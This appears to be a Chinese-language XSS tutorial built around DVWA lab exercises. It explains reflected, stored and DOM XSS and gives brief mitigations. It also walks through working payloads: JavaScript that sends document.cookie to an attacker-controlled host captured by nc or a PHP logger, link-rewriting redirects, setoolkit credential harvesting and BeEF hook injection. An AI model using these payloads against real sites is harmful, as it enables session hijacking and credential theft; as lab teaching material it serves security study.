# XSS(跨站脚本)攻击与防御

# 1.XSS攻击概述

```shell
攻击者在被攻击的Web服务器网页中嵌入恶意脚本，
通常是用JavaScrip编写的恶意代码，当用户使用浏览器访问被嵌入恶意代码的网页时，
恶意代码将会在用户的浏览器上执行。


1.hacker向服务端写了恶意代码
2.用户在客户端请求服务端数据时，受到了危害

#危害
盗取用户cookie
修改页面内容
网站挂马
利用网站重定向
XSS蠕虫

#注意！！！！
XSS 攻击的恶意代码大都使用JavaScript语言编写，是深入研究XSS，先精通javascript.

#关闭chrome的XSS防御
桌面-->右键-->新建-->快捷方式-->输入-->
C:\Users\zx\AppData\Local\Google\Chrome\Application\chrome.exe --args --disable-xss-auditor

#
```

## 1.1 js读取cookie

```shell
var c = document.cookie
```

# 2.反射型XSS

## 2.1 概念

```shell
反射型XSS 又称之为非持久型XSS，
黑客需要通过诱使用户点击包含XSS攻击代码的恶意链接，
然后用户浏览器执行恶意代码触发XSS漏洞。
```

## 2.2 现象

```shell
1.打开dvwa靶场

2.设置DVWA Security 的 security level 级别为 low

3.选择XSS(Reflected)

4.输入
<script>alert('reflected xss')</script>
或者
<script>alert(document.cookie)</script>

5.提交
点击submit按钮，即可看到现象
```

## 2.3 规避

```shell
(1) 对用户的输入进行合理验证（如年龄只能是数字），
对特殊字符（如 <、>、’、”等）以及<script>、javascript 等进行过滤。

(2) 根据数据将要置于 HTML 上下文中的不同
位置（HTML 标签、HTML 属性、JavaScript 脚本、CSS、URL
），对所有不可信数据进行恰当的输出编码。

(3) 设置HttpOnly属性，避免攻击者利用XSS漏洞进行Cookie劫
持攻击。在 JavaEE 中，给Cookie添加HttpOnly的代码如下：
response.setHeader("set-cookie", "cookiename=cookievalue; path=/;
Domain=domainvalue; Max-ages=3600seconds; HttpOnly");
```

# 3.存储型XSS

## 3.1 概念

```shell
存储型 XSS
会把用户输入的数据存储在服务器端，这种XSS可以持久化，而且更加稳定。

比如黑客写了一篇包含XSS恶意代码的博客文章，
那么访问该博客的所有用户他们的浏览器中都会执行黑客构造的XSS 恶意代码，
通常这种攻击代码会以文本或数据库的方式保存在服务器端，所以称之为存储型XSS。
```

## 3.2 现象

```shell
1.打开dvwa靶场

2.设置DVWA Security 的 security level 级别为 low

3.选择XSS(Stored)

4.输入
Name:zx
Message:
<script>alert('reflected xss')</script>
或者
<script>alert(document.cookie)</script>

5.提交
点击sign guestbook按钮，即可看到现象

6.刷新页面后，仍然能看到此现象
```

## 3.3 规避

```shell

```

# 4.DOM型XSS

## 4.1 概念

```shell
DOM概述:HTML DOM 定义了访问和操作HTML文档的标准方法。
DOM 将HTML文档表达为树结构。
```

## 4.2 现象

```shell
1.打开dvwa靶场

2.设置DVWA Security 的 security level 级别为 low

3.选择XSS(DOM)

4.直接在浏览器中输入：
http://10.102.224.206:9093/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(document.cookie)%3C/script%3E

5.观察现象即可
```

## 4.3 规避

```she

```

# 5.XSS攻击实例

## 5.1 获取 cookie

```shell
1.在 kali 启动 apache
service apache2 start

2.编辑文件
cd /var/www/html

vi xss_cookie.js
var img = new Image();
img.src = "http://10.102.224.103:88/cookie.php?cookie="+document.cookie;

3.在 kali 上开启对 88 端口的监听
nc -nlvp 88

4.在dvwa靶场
>> 设置DVWA Security 的 security level 级别为 low
>> 选择XSS(Stored)
>> 输入
Name: xss_cookie
Message:
<script src="http://10.102.224.103/xss_cookie.js"></scritp>
(如果Message里长度受限，就f12打开控制台后，修改前端的长度限制即可)
>> 提交
点击sign guestbook按钮，即可看到现象

5.此时在刚才的nc命令处即可看到对应的cookie信息
connect to [10.102.224.103] from (UNKNOWN) [10.102.225.226] 59982
GET /cookies.php?cookie=security_level=0;%20PHPSESSID=37kufee9brpnps2664rgvtm245;%20security=low HTTP/1.1
Host: 10.102.224.103:88
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://10.102.224.206:9093/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

#注意：
10.102.224.103 是kali或者攻击者获取信息的地址或中转地址
```

## 5.2 获取 cookie(方法2)

```shell
1.在 kali 启动 apache
service apache2 start

2.编辑文件
cd /var/www/html

vi cookies.php
<?php
$cookie=$_GET['cookie'];
file_put_contents('cookie.txt', $cookie);
?>

vi xss_cookie_php.js
var img = new Image();
img.src = "http://10.102.224.103/cookies.php?cookie="+document.cookie;

touch cookie.txt
#赋予 www-data 的用户权限
chown www-data. cookies.php
chown www-data. cookie.txt
#测试一下手动提交cookie是否被保存到cookie.txt中
http://10.102.224.103/cookies.php?cookie=123
#此时cat cookie.txt，如果里面内容是123表示存储成功

3.在dvwa靶场
>> 设置DVWA Security 的 security level 级别为 low
>> 选择XSS(Stored)
>> 输入
Name: xss_cookie_php
Message:
<script src="http://10.102.224.103/xss_cookie_php.js"></scritp>
(如果Name 或者 Message里长度受限，就f12打开控制台后，修改前端的长度限制即可)
>> 提交
点击sign guestbook按钮，即可看到现象

4.此时在刚才的cookie.txt文件中便可以看到对应的cookie信息

#注意：
10.102.224.103 是kali或者攻击者获取信息的地址或中转地址
```

## 5.3 利用XSS重定向网页

### 5.3.1 修改页面链接的原理

```shell
1.跳转到恶意网站劫持用户浏览器。
2.跳转到广告页面获取利益，或者跳转到固定页面对网站进行刷流量。
```

### 5.3.2 攻击步骤

```shell
1.编写脚本
<script>
window.onload=function(){
    var link = document.getElementsByTagName("a");
    for (i = 0; i < link.length; i++) {
        link[i].href="https://www.baidu.com"
    }
}
</script>

2.打开dvwa靶场
>> 设置DVWA Security 的 security level 级别为 low
>> 选择XSS(Reflected)
>> 输入上文脚本
>> 提交

3.刷新页面后，任意点击页面a标签的链接，都将跳转到baidu
f12打开控制台后，即可看到a标签里的href变为
```

## 5.4 利用XSS劫持目标用户名及密码(setoolkit)

### 5.4.1 setoolkit 克隆站点

```shell
setoolkit 是一个万能的社工工具。

#使用步骤
1.在kali中输入 setoolkit，回车即可
>> 同意服务条款
>> 选择 1) Social-Engineering Attacks
>> 选择 2) Website Attack Vectors
>> 选择 3) Credential Harvester Attack Method
>> 选择 2) Site Cloner
>> 直接回车，用kali本机IP进行监听
>> 输入一个需要clone的url, 这里输入：
http://10.102.224.206:9093/login.php
>> Do you want to attempt to disable Apache? [y/n]:
输入 y

2.在浏览器中输入kali的IP即可，如
10.102.224.103

3.在登录界面输入用户名，密码之后，用户界面会重定向到真实的网页，
而在kali控制台即可看到用户名，密码。

注意：
如果没能成功，就彻底退出setoolkit，然后重新开始。
```

```shell
在dvwa靶场
>> 设置DVWA Security 的 security level 级别为 low
>> 选择XSS(Stored)
>> 输入
Name: xss_redirect
Message:
<script>window.location="http://10.102.224.103/"</script>
(如果Name 或者 Message里长度受限，就f12打开控制台后，修改前端的长度限制即可)
>> 提交
点击sign guestbook按钮，即可看到重定向到了登录界面

此时，若是输入用户名密码，则被劫持。
```

# 6.BeEF

## 6.1 BeEF简介

```shell
BeEF是由Wade Alcorn 在2006年开始创建的，至今还在维护。
是使用ruby语言开发的专门针对浏览器攻击的框架。
也可以理解为一款注于浏览器端的渗透测试工具，这个框架也属于C/S的结构。

zombie（僵尸）即受害的浏览器。
zombie是被hook（勾连）的，如果浏览器访问了有勾子（由js编 写）的页面，就会被hook，
勾连的浏览器会执行初始代码返回一些信息，
接着zombie会每隔一段时间 （默认为1秒）就会向BeEF服务器发送一个请求，
询问是否有新的代码需要执行。

BeEF服务器本质上就 像一个Web应用，被分为前端UI，和后端。
前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， 
BeEF持有者可以通过浏览器来登录BeEF 的后台管理UI。

#在kali下使用BeEF
kali默认已经安装BeEF了。
BeEF是Favorites 菜单中的一个（可以看出它的受欢迎程度和地位了），其标志是一个蓝色的公牛。
命令是 beef-xss,

打开五秒后，它还会使用浏览器打开管理页面的UI，
默认帐号密码是：beef/beef，默认管理页面的UI 地址是：
http://127.0.0.1:3000/ui/panel

kali已经把beef-xss做成服务了，推荐使用systemctl 命令来启动或关闭beef服务器:
systemctl start beef-xss.service
systemctl stop beef-xss.service
systemctl restart beef-xss.service

#如果忘记密码，就直接去查看配置文件即可
cat /etc/beef-xss/config.yaml

#hook脚本的位置
<script src="http://<IP>:3000/hook.js"></script>

#BeEF命令模块的使用·
#命令模块的分类
绿色∶表示该类的命令模块可以在当前浏览器中执行，并执行结果对于用户是不可见
橙色∶表示该类的命令模块可以在当前浏览器中执行，但其执行结果对用户是可见的
红色∶表示该类的命令模块不能够在当前浏览器中执行
灰色∶模块尚未在目标浏览器中测试过

2.
```

## 6.2 存储型XSS 注入hook脚本结合BeEF劫持用户浏览器

```shell
1.打开dvwa靶场

2.设置DVWA Security 的 security level 级别为 low

3.选择XSS(Stored)

4.输入
Name:zx_beef
Message:
<script src="http://10.102.224.103:3000/hook.js"></script>


5.提交
点击sign guestbook按钮

6.在BeEF控制台，可以看到受控浏览器
```

# 7.存储型XSS结合Metasploit攻击框架

## 7.1 概述

```shell
Metasploit是一个渗透测试平台，使您能够查找利用和验证漏洞，
Metasploit自带了数百个已知软件漏洞的专业级漏洞攻击工具。

Metasploit是模块化结构，对其已知的漏洞查找、验证、利用都是模块的形式去完成，
因为我们在学习Metasploit主要是应该学习Metasploit的基本操作和漏洞的模块使用。

比如:对于一个已知的漏洞，在 Metasploit中就会有对应的漏洞利用模块
而渗透测试人员直接利用Metasploit 框架，并调用与之对应的模块就可以完成漏洞的利用，
那么对于一些Metasploit框架中没有自带的漏洞模块，
我们可以手动加载到 Metasploit框架中，并可以对其加以利用。

例如:
XSSF模块在 Metasploit中就没有自带，因此我们就可以手动添加该模块。

1.
```

## 7.2 攻击

```shell

```
